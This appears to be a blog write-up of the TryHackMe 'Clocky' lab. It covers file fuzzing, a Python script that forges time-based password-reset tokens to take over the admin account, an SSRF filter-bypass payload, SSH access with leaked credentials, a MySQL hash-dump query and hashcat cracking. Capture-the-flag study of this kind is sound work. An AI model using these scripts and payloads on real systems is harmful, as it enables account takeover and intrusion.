@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the robots.txt file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&amp;rsquo;s password reset mechanism, granting us access to the administrative dashboard." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/posts/2024/04/thm-clocky/" />
+
+
+    <title>
+        
+            THM: Clocky
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: Clocky">
+<meta itemprop="description" content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the robots.txt file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard."><meta itemprop="datePublished" content="2024-04-10T13:03:18-05:00" />
+<meta itemprop="dateModified" content="2024-04-10T13:03:18-05:00" />
+<meta itemprop="wordCount" content="1331"><meta itemprop="image" content="https://scorpiosec.com/images/" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/" /><meta name="twitter:title" content="THM: Clocky"/>
+<meta name="twitter:description" content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the robots.txt file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard."/>
+
+
+
+    <meta property="og:title" content="THM: Clocky" />
+<meta property="og:description" content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the robots.txt file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/posts/2024/04/thm-clocky/" /><meta property="og:image" content="https://scorpiosec.com/images/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-10T13:03:18-05:00" />
+<meta property="article:modified_time" content="2024-04-10T13:03:18-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-04-10 13:03:18 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/posts/2024/04/thm-clocky/">THM: Clocky</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#flag-1">Flag 1</a></li>
+    <li><a href="#flag-2">Flag 2</a></li>
+    <li><a href="#flag-3">Flag 3</a></li>
+    <li><a href="#flag-4">Flag 4</a></li>
+    <li><a href="#flag-5">Flag 5</a></li>
+    <li><a href="#flag-6">Flag 6</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Codify" target="_blank" >Clocky</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>For this challenge our objective is to locate six flags. Our inital step involves examining the <code>robots.txt</code> file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard.</p>
+<p>The dashboard presents a form vulnerable to Server-Side Request Forgery (SSRF), enabling us to acquire a file with plaintext passwords. By combining the user names we enumerate and the passwords, we get an initial foothold into the system via SSH.</p>
+<p>Further exploration revealed a mysql database; however attempting to read one of its table&rsquo;s content produces some indecipherable output because of the <code>cache_sha2_password</code> plugin&rsquo;s encryption. Eventually, using a meticulously crafted query, we successfully dump the password hashes in a legible format and after cracking them we get the root password.</p>
+<p>Target IP  - <code>10.10.62.39</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Clocky 10.10.62.39
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-09 22:51 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.62.39
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8000/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">3</span> disallowed entries 
+</span></span><span style="display:flex;"><span>|_/*.sql$ /*.zip$ /*.bak$
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 55.02 seconds
+</span></span></code></pre></div><p>We find three ports open 22 (SSH), 80 (HTTP - Apache) and 8000 (HTTP - Nginx). Both web servers seems to return a 403 status code.</p>
+<h2 id="flag-1">Flag 1</h2>
+<p>Both <code>http://10.10.62.39/</code> and <code>http://10.10.62.39:8000/</code> return <code>403 Fordbidden</code> as we could see in nmap.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/Apache-403.png" alt="Apache 403 error"></p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/Nginx-403.png" alt="Nginx 403 error"></p>
+<p>From the nmap output we can see that the service on port 8000 has some disallowed entries for <code>robots.txt</code>. Visiting <code>http://10.10.62.39:8000/robots.txt</code>, we find a list of those same entries and flag 1.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flag1.png" alt="Clocky Flag 1"></p>
+<pre tabindex="0"><code>THM{14b45bb9eefdb584b79063eca6a31b7a}
+</code></pre><hr>
+<h2 id="flag-2">Flag 2</h2>
+<p>Directory enumeration on the first web server with gobuster is unfruitful, we switch to ffuf to fuzz for files.</p>
+<p>We fuzz for all the extensions mentioned in <code>robots.txt</code>. Only <code>.zip</code> returns a result and we find <code>index</code>.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Clocky/ffuf-zip.png" alt="File fuzzing results"></p>
+<p>We get a file called <code>index.zip</code> after going to <code>http://10.10.62.39:8000/index.zip</code> and extracting the archive gives us flag 2.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flag2.png" alt="Clocky Flag 2"></p>
+<pre tabindex="0"><code>THM{1d3d62de34a3692518d03ec474159eaf}
+</code></pre><hr>
+<h2 id="flag-3">Flag 3</h2>
+<p>The archive also contains a python file <code>app.py</code>, which appears to be the source code for a Flask application. At the end of the code we see that the app is running on port <code>8080</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flask-app-8080.png" alt="Flask app on port 8080"></p>
+<p>Navigating to <code>http://10.10.62.39:8080/</code> we get to a static website.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/clocky-website.png" alt="Clocky website on port 8080"></p>
+<p>In the source code we find multiple endpoints such as:</p>
+<ul>
+<li><code>/administrator</code> which has a login form.</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/administrator.png" alt="Clocky administrator endpoint"></p>
+<ul>
+<li><code>/forgot_password</code> which allows to reset a password after the user provides a valid username.</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/password-reset.png" alt="Clocky forgot_password endpoint"></p>
+<ul>
+<li><code>/password_reset</code>, this endpoint leads to a page with the message <code>Invalid Parameter</code>. In the code we see that we need to provide a token value.</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/pwd_reset.png" alt="Clocky forgot_password endpoint"></p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/token-expected.png" alt="Clocky token value expected"></p>
+<p>Moreover the generation of the token is time sensitive. Here is how it works:</p>
+<ul>
+<li>once the application confirms that the user name provided exists in the database it gets the server&rsquo;s current date and time and stores it in <code>value</code>.</li>
+<li><code>value</code> is then converted into a string and the last 4 characters are removed. A space, a dot and the upper case version of the user name are then appended to the string.</li>
+<li>the <code>lnk</code> string is finally hashed using SHA-1 (which is insecure).</li>
+</ul>
+<p>So to exploit it we have to:</p>
+<ul>
+<li>provide a valid username</li>
+<li>sync our date and time with the server&rsquo;s</li>
+<li>generate a valid token value</li>
+<li>reset the password of the adminstrator account</li>
+</ul>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/token-gen-code.png" alt="Clocky token value expected"></p>
+<p>We use the script below to achieve it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the target URL, change the IP acordingly</span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.62.39:8080/&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a POST request to synchronize time</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;administrator&#34;</span>}
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;forgot_password&#34;</span>, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a GET request to fetch the current time</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    time_pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;The current time is (\d</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74"> \d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">)&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(time_pattern, response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>        current_time_str <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Synchronized time:&#34;</span>, current_time_str)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Generate and check valid tokens</span>
+</span></span><span style="display:flex;"><span>        valid_tokens <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ms <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>            ms_str <span style="color:#f92672">=</span> str(ms)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)  
+</span></span><span style="display:flex;"><span>            token_data <span style="color:#f92672">=</span> current_time_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> ms_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; . &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;administrator&#34;</span><span style="color:#f92672">.</span>upper()
+</span></span><span style="display:flex;"><span>            hashed_token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(token_data<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;password_reset&#39;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;token&#39;</span>: hashed_token})
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;&lt;h2&gt;Invalid token&lt;/h2&gt;&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Generated token: </span><span style="color:#e6db74">{</span>hashed_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) 
+</span></span><span style="display:flex;"><span>                valid_tokens<span style="color:#f92672">.</span>append(hashed_token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Generated tokens:&#34;</span>, valid_tokens) 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: Could not parse server time from response.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Error: Failed to fetch server response.&#34;</span>)
+</span></span></code></pre></div><p>Go to <code>/forgot_password</code> and input administrator.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/admin-reset.png" alt="administrator account reset"></p>
+<p>After running the script we get a token value that we need to add to <code>/password_reset</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/clocky-py.png" alt="python script to generate valid token values"></p>
+<pre tabindex="0"><code>10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
+</code></pre><p>Our token value is correct and we are able to reset the password of the user <code>administrator</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/pwd-reset-success.png" alt="password reset success"></p>
+<p>Going back to <code>/dashboard</code> we can login with <code>administrator:Password_you_picked</code> and we get the flag 3.</p>
+<pre tabindex="0"><code>THM{ee68e42f755f6ebbcd89439432d7b462}
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Clocky/admin-dashboard.png" alt="admin dashboard"></p>
+<hr>
+<h2 id="flag-4">Flag 4</h2>
+<p>On the Administrator Dashboard we can submit a <code>Location</code> and download a file. After capturing the request with Burp Suite I can see that it uses the <code>location</code> parameter.</p>
+<p>It turns out to be vulnerable to SSRF.</p>
+<blockquote>
+<p>&ldquo;A <strong>Server-side Request Forgery (SSRF)</strong> vulnerability occurs when an attacker manipulates a <strong>server-side application</strong> into making <strong>HTTP requests</strong> to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.&rdquo; Source - <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" >hacktricks</a>
+
+</p>
+</blockquote>
+<p>We can find plenty of payloads on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters" target="_blank" >PayloadsAllTheThings</a>
+
+. I used <code>http://127.0.0.1:80</code> but it fails and we get <code>Action not permitted</code> in the response, implying that there is a filter that we need to bypass.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/SSRF.png" alt="SSRF test"></p>
+<p>I found a SSRF cheat sheet <a href="https://highon.coffee/blog/ssrf-cheat-sheet/" target="_blank" >here</a>
+
+ and the payload <code>http://0x7f000001/</code> works.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/SSRF-payload.png" alt="SSRF working payload"></p>
+<p>At the beginning of the source code you can see the comment to execute <code>datbase.sql</code>. We use that for the file name and get a hit with the value for the flag 4.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/db-sql.png" alt="database.sql file comment"></p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flag4.png" alt="Flag 4"></p>
+<pre tabindex="0"><code>THM{350020dc1a53e50e1e92bac2c35dd0a2}
+</code></pre><p>After forwarding the request we get a file called <code>file.txt</code>.</p>
+<hr>
+<h2 id="flag-5">Flag 5</h2>
+<blockquote>
+<p>The hint for this flag is &ldquo;Have you gathered any usernames yet?&rdquo;</p>
+</blockquote>
+<p><code>file.txt</code> leaks the password <code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and the username <code>clocky_user</code>. The source code only mentions two other names <code>jane</code> and <code>clarice</code>.</p>
+<p>After trying the password with the different users we are able to login via SSH with <code>clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and grab flag 5.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flag5.png" alt="Flag 5"></p>
+<pre tabindex="0"><code>THM{e57dfa35e62d518cfd215dd7729d0877}
+</code></pre><hr>
+<h2 id="flag-6">Flag 6</h2>
+<p>In <code>/home/clarice/app</code> we find the hidden file <code>.env</code> which reveals the database password <code>seG3mY4F3tKCJ1Yj</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/db-pwd.png" alt="database password"></p>
+<p>The result of <code>ss -lntp</code> confirms that MySQL is running on the server.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/services-intern.png" alt="Internal services running"></p>
+<p>Using <code>clocky_user:seG3mY4F3tKCJ1Yj</code> we connect to MySQL.</p>
+<pre tabindex="0"><code>mysql -u clocky_user -p
+</code></pre><p>The <code>clocky</code> database only contains the credentials of the <code>administrator</code> user.</p>
+<p>In the <code>mysql</code> database we find a <code>user</code> table.</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/mysql-db.png" alt="mysql database"></p>
+<p>The query <code>select * from user</code> produced some illegible output.</p>
+<blockquote>
+<p>If you pay close attention, you can actually grab a password hash from the output but I doubt this is the intended way to get the flag.</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/user-output.png" alt="sql query output"></p>
+<p>In the output we repeatedly see <code>caching_sha2_password</code> which is an authentication plugin using sha256.</p>
+<p>Searching <code>how to dump mysql sha256 hashes with caching_sha2_password?</code> on Google we find this <a href="https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------" target="_blank" >hashcat issue page</a>
+
+ where we can find multiple queries to achieve our goal.</p>
+<pre tabindex="0"><code>SELECT user, CONCAT(&#39;$mysql&#39;,LEFT(authentication_string,6),&#39;*&#39;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#39;*&#39;)) AS hash FROM user WHERE plugin = &#39;caching_sha2_password&#39; AND authentication_string NOT LIKE &#39;%INVALIDSALTANDPASSWORD%&#39;;
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Clocky/hashes-dump.png" alt="hashes dump"></p>
+<p>The first <code>dev</code> password hash gives the password <code>armadillo</code>.</p>
+<pre tabindex="0"><code>hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p>Using the newly found password we are able to connect as root and grab flag 6 in <code>/root</code> and that&rsquo;s all of them!</p>
+<p><img src="https://scorpiosec.com/images/THM-Clocky/flag6.png" alt="Flag 6"></p>
+<p>This challenge was pretty interesting and I hope my write up was useful to you. I think knowing Python is becoming more and more valuable for technical security professionals and taking the time to learn it will probably pay massive dividends in the future. You can read Automate the Boring Stuff with Python by Al Sweigart for free <a href="http://automatetheboringstuff.com/2e/" target="_blank" >here</a>
+
+.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1331 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-04-10 13:03
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
